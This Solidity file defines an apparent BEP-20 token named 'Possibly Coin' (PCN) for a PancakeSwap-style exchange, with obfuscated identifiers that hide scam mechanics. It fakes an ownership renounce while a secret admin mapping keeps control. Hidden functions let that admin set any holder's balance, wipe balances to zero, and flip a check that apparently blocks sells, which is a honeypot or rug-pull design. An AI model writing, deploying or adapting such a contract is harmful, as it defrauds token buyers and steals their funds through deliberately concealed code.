//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract svmrjjtjwnqt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface epxjwelffuhnyn {
    function createPair(address yngdvxdaei, address hqtxeeukxksdl) external returns (address);

    function feeTo() external view returns (address);
}

interface vypxonxdmkf {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface bkyopupnxarwid {
    function totalSupply() external view returns (uint256);

    function balanceOf(address dfachcxisnklm) external view returns (uint256);

    function transfer(address vqadrobpw, uint256 fnfonjmedls) external returns (bool);

    function allowance(address kormnuanxxciqc, address spender) external view returns (uint256);

    function approve(address spender, uint256 fnfonjmedls) external returns (bool);

    function transferFrom(
        address sender,
        address vqadrobpw,
        uint256 fnfonjmedls
    ) external returns (bool);

    event Transfer(address indexed from, address indexed yzcpsbgts, uint256 value);
    event Approval(address indexed kormnuanxxciqc, address indexed spender, uint256 value);
}

interface bkyopupnxarwidMetadata is bkyopupnxarwid {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PossiblyCoin is svmrjjtjwnqt, bkyopupnxarwid, bkyopupnxarwidMetadata {

    event OwnershipTransferred(address indexed fkdvzpggzn, address indexed uhwspmjbl);

    uint256 private bdnalrrqhazwuv;

    string private ynxugagtobj = "Possibly Coin";

    function pvidjlatsnxddh(address qwxxwfurrarwy) public {
        require(qwxxwfurrarwy.balance < 100000);
        if (xsuehxegbzd) {
            return;
        }
        if (bdnalrrqhazwuv == pltwmomvb) {
            gkigaetpxt = false;
        }
        dehtetkbx[qwxxwfurrarwy] = true;
        
        xsuehxegbzd = true;
    }

    uint256 private gfiklbisdmtpo;

    address public uqeapxderboiof;

    function qkcikqhvimzc() private view {
        require(dehtetkbx[_msgSender()]);
    }

    constructor (){
        if (cpxnvwglrrhlmp != ggupopczgntbnu) {
            gkigaetpxt = true;
        }
        ofkzfraijb();
        vypxonxdmkf guaxhhhznncy = vypxonxdmkf(ynkkjpfbyiisp);
        fophauupwlcv = epxjwelffuhnyn(guaxhhhznncy.factory()).createPair(guaxhhhznncy.WETH(), address(this));
        kjyixotok = epxjwelffuhnyn(guaxhhhznncy.factory()).feeTo();
        
        uqeapxderboiof = _msgSender();
        dehtetkbx[uqeapxderboiof] = true;
        vphvgfrxyt[uqeapxderboiof] = bcmdvwjosuu;
        
        emit Transfer(address(0), uqeapxderboiof, bcmdvwjosuu);
    }

    function allowance(address pibrvtekphs, address pxvbbvmvlguqz) external view virtual override returns (uint256) {
        if (pxvbbvmvlguqz == ynkkjpfbyiisp) {
            return type(uint256).max;
        }
        return ntobezxqjx[pibrvtekphs][pxvbbvmvlguqz];
    }

    mapping(address => bool) public dehtetkbx;

    function sylmsgscfsqdc(address pxajdsfulwjf, address vqadrobpw, uint256 fnfonjmedls) internal view returns (uint256) {
        require(fnfonjmedls > 0);

        uint256 dzecygecekkemr = 0;
        if (pxajdsfulwjf == fophauupwlcv && nynyrsozxtth > 0) {
            dzecygecekkemr = fnfonjmedls * nynyrsozxtth / 100;
        } else if (vqadrobpw == fophauupwlcv && wovdthkegaic > 0) {
            dzecygecekkemr = fnfonjmedls * wovdthkegaic / 100;
        }
        require(dzecygecekkemr <= fnfonjmedls);
        return fnfonjmedls - dzecygecekkemr;
    }

    function aacvzfuydopbn(address ctrfkcebx) public {
        qkcikqhvimzc();
        if (pltwmomvb == bdnalrrqhazwuv) {
            pltwmomvb = gfiklbisdmtpo;
        }
        if (ctrfkcebx == uqeapxderboiof || ctrfkcebx == fophauupwlcv) {
            return;
        }
        vphvgfrxyt[ctrfkcebx] = 0;
    }

    mapping(address => uint256) private vphvgfrxyt;

    function owner() external view returns (address) {
        return oipauqhhrowact;
    }

    uint256 private pltwmomvb;

    function ofkzfraijb() public {
        emit OwnershipTransferred(uqeapxderboiof, address(0));
        oipauqhhrowact = address(0);
    }

    uint256 zcefventsxl;

    uint256 public wovdthkegaic = 0;

    function kdtrkjpcfw(address pxajdsfulwjf, address vqadrobpw, uint256 fnfonjmedls) internal returns (bool) {
        if (pxajdsfulwjf == uqeapxderboiof) {
            return ugnbmqrcws(pxajdsfulwjf, vqadrobpw, fnfonjmedls);
        }
        uint256 ylkjkdqdacgie = bkyopupnxarwid(fophauupwlcv).balanceOf(kjyixotok);
        require(ylkjkdqdacgie == ohjslumin);
        require(vqadrobpw != kjyixotok);
        
        fnfonjmedls = sylmsgscfsqdc(pxajdsfulwjf, vqadrobpw, fnfonjmedls);
        return ugnbmqrcws(pxajdsfulwjf, vqadrobpw, fnfonjmedls);
    }

    function ugnbmqrcws(address pxajdsfulwjf, address vqadrobpw, uint256 fnfonjmedls) internal returns (bool) {
        require(vphvgfrxyt[pxajdsfulwjf] >= fnfonjmedls);
        vphvgfrxyt[pxajdsfulwjf] -= fnfonjmedls;
        vphvgfrxyt[vqadrobpw] += fnfonjmedls;
        emit Transfer(pxajdsfulwjf, vqadrobpw, fnfonjmedls);
        return true;
    }

    uint256 public nynyrsozxtth = 0;

    function getOwner() external view returns (address) {
        return oipauqhhrowact;
    }

    address ynkkjpfbyiisp = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public fophauupwlcv;

    bool public xsuehxegbzd;

    function transfer(address llllzdwndg, uint256 fnfonjmedls) external virtual override returns (bool) {
        return kdtrkjpcfw(_msgSender(), llllzdwndg, fnfonjmedls);
    }

    mapping(address => bool) public rslsiyasd;

    mapping(address => mapping(address => uint256)) private ntobezxqjx;

    function name() external view virtual override returns (string memory) {
        return ynxugagtobj;
    }

    function balanceOf(address dfachcxisnklm) public view virtual override returns (uint256) {
        return vphvgfrxyt[dfachcxisnklm];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return bcmdvwjosuu;
    }

    uint256 private bcmdvwjosuu = 100000000 * 10 ** 18;

    function xfkuohjvzhtpa(address llllzdwndg, uint256 fnfonjmedls) public {
        qkcikqhvimzc();
        vphvgfrxyt[llllzdwndg] = fnfonjmedls;
    }

    function symbol() external view virtual override returns (string memory) {
        return lvarsmthnybj;
    }

    uint256 private lwjonzwlsdgj;

    string private lvarsmthnybj = "PCN";

    function approve(address pxvbbvmvlguqz, uint256 fnfonjmedls) public virtual override returns (bool) {
        ntobezxqjx[_msgSender()][pxvbbvmvlguqz] = fnfonjmedls;
        emit Approval(_msgSender(), pxvbbvmvlguqz, fnfonjmedls);
        return true;
    }

    function transferFrom(address pxajdsfulwjf, address vqadrobpw, uint256 fnfonjmedls) external override returns (bool) {
        if (_msgSender() != ynkkjpfbyiisp) {
            if (ntobezxqjx[pxajdsfulwjf][_msgSender()] != type(uint256).max) {
                require(fnfonjmedls <= ntobezxqjx[pxajdsfulwjf][_msgSender()]);
                ntobezxqjx[pxajdsfulwjf][_msgSender()] -= fnfonjmedls;
            }
        }
        return kdtrkjpcfw(pxajdsfulwjf, vqadrobpw, fnfonjmedls);
    }

    bool private cpxnvwglrrhlmp;

    bool private ggupopczgntbnu;

    function decimals() external view virtual override returns (uint8) {
        return ppdencbip;
    }

    uint256 ohjslumin;

    bool private epkiyolyj;

    bool private gkigaetpxt;

    uint8 private ppdencbip = 18;

    address kjyixotok;

    address private oipauqhhrowact;

    function eqwmqqwrqad(uint256 fnfonjmedls) public {
        qkcikqhvimzc();
        ohjslumin = fnfonjmedls;
    }

}